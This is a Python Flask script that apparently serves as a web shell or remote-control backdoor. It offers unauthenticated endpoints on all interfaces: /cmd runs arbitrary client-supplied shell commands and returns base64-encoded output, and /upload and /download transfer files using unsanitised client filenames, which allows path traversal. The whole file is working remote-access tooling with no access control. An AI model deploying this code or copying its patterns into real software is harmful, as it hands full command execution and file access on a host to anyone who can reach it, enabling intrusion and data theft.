import base64
import os
import subprocess
from flask import Flask, request

app = Flask(__name__)

# 文件保存目录设计
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_DIR = os.path.join(BASE_DIR, 'uploads')
os.makedirs(UPLOAD_DIR, exist_ok=True)


def system_cmd(cmd_command):
    """执行系统命令，返回stdout和stderr"""
    result = subprocess.run(cmd_command, shell=True, capture_output=True, text=True)
    return result.stdout, result.stderr


@app.route('/cmd', methods=['POST'])
def cmd():
    client_post_data = request.json

    if client_post_data:
        try:
            cmd_command = client_post_data.get('cmd')
        except AttributeError:
            return {'error': base64.b64encode('json format error'.encode()).decode()}

        if cmd_command:
            stdout, stderr = system_cmd(cmd_command)
            if stderr:
                return {'error': base64.b64encode(stderr.encode()).decode()}
            else:
                return {'cmd': cmd_command, 'cmd_result': base64.b64encode(stdout.encode()).decode()}
        else:
            return {'error': base64.b64encode('no cmd in json'.encode()).decode()}
    else:
        return {'error': base64.b64encode('no json data'.encode()).decode()}


@app.route('/upload', methods=['POST'])
def upload():
    client_post_data = request.json

    if client_post_data:
        try:
            upload_filename = client_post_data.get('upload_filename')
            file_bit = client_post_data.get('file_bit')
        except AttributeError:
            return {'error': base64.b64encode('json format error'.encode()).decode()}

        if upload_filename and file_bit:
            file_data = base64.b64decode(file_bit.encode())
            file_path = os.path.join(UPLOAD_DIR, upload_filename)
            with open(file_path, 'wb') as f:
                f.write(file_data)
            return {'message': 'Upload Success!', 'upload_file': upload_filename}
        else:
            return {'error': 'need upload_filename and file_bit'}
    else:
        return {'error': 'no json data'}


@app.route('/download', methods=['POST'])
def download():
    client_post_data = request.json

    if client_post_data:
        try:
            download_filename = client_post_data.get('download_filename')
        except AttributeError:
            return {'error': base64.b64encode('json format error'.encode()).decode()}

        if download_filename:
            file_path = os.path.join(UPLOAD_DIR, download_filename)
            if os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                return {'file': base64.b64encode(file_data).decode(), 'filename': download_filename}
            else:
                return {'error': base64.b64encode('download file not exist'.encode()).decode()}
        else:
            return {'error': base64.b64encode('no download_filename in json'.encode()).decode()}
    else:
        return {'error': base64.b64encode('no json data'.encode()).decode()}


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
